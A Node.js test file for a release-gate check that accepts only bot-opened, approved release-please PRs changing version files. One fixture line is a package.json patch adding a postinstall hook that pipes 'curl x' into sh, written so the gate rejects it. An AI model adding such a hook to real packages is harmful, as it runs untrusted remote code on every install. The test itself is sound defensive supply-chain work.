import assert from 'node:assert/strict'
import { test } from 'node:test'

import { decide, JAMES_ID, onlyVersionChanged, RELEASE_BOT_ID } from './releaseCheck.mjs'

const versionPatch = '@@ -1,6 +1,6 @@\n {\n   "name": "gate-test-web",\n-  "version": "0.1.0",\n+  "version": "0.1.1",\n   "private": true,'

const good = (over = {}) => ({
  sha: 'merge',
  release: { authorId: RELEASE_BOT_ID },
  pr: { merged: true, mergeSha: 'merge', authorId: RELEASE_BOT_ID, headRef: 'release-please--branches--main', headSha: 'head' },
  reviews: [{ userId: JAMES_ID, state: 'APPROVED', commitId: 'head' }],
  files: [
    { name: 'CHANGELOG.md', patch: '+## 0.1.1' },
    { name: '.release-please-manifest.json', patch: '-  ".": "0.1.0"\n+  ".": "0.1.1"' },
    { name: 'package.json', patch: versionPatch },
  ],
  ...over,
})

test('a release PR James approved, released by the release App, passes', () => {
  assert.deepEqual(decide(good()), { ok: true, reasons: [] })
})

test('a hand-made tag (no release, or a release by someone else) is refused', () => {
  assert.equal(decide(good({ release: null })).ok, false)
  assert.equal(decide(good({ release: { authorId: JAMES_ID } })).ok, false)
})

test('a tag on a commit that is not a merged release PR is refused', () => {
  assert.equal(decide(good({ pr: null, reviews: [], files: [] })).ok, false)
  const ordinary = { merged: true, mergeSha: 'merge', authorId: RELEASE_BOT_ID, headRef: 'feature/x', headSha: 'head' }
  assert.equal(decide(good({ pr: ordinary })).ok, false)
})

test('a release-please branch PR opened by someone other than the release App is refused', () => {
  const result = decide(good({ pr: { ...good().pr, authorId: JAMES_ID } }))
  assert.equal(result.ok, false)
  assert.match(result.reasons.join(' '), /not opened by the release App/)
})

test('a release PR without James’s approval at its head is refused', () => {
  assert.equal(decide(good({ reviews: [] })).ok, false)
  assert.equal(decide(good({ reviews: [{ userId: JAMES_ID, state: 'APPROVED', commitId: 'older' }] })).ok, false)
})

test('a release PR with an extra file is refused', () => {
  const files = [...good().files, { name: 'src/pages/index.astro', patch: '+<script>' }]
  const result = decide(good({ files }))
  assert.equal(result.ok, false)
  assert.match(result.reasons.join(' '), /unexpected file/)
})

test('package.json may change only its version', () => {
  assert.equal(onlyVersionChanged(versionPatch), true)
  assert.equal(onlyVersionChanged('-  "version": "0.1.0",\n+  "version": "0.1.1",\n+  "postinstall": "curl x | sh",'), false)
  assert.equal(onlyVersionChanged(undefined), false)
})
